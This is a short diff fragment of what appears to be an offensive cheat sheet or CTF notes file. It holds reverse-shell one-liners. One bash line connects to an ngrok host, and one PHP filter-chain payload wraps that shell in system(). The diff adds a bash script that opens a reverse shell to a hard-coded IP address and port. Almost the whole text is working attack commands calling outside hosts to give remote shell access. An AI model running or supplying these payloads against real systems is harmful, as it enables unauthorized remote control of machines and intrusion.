@@ -13,3 +13,9 @@ bash -c "sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/19954 0>&"
 ```
 python3 php_filter_chain_generator.py --chain '<?php system("bash -c \'sh -i >& /dev/tcp/0.tcp.jp.ngrok.io/19954 0>&\'"); ?> '
 ```
+
+```sh
+#! /bin/bash
+
+bash -i >& /dev/tcp/211.250.216.249/7000 0>&1
+```
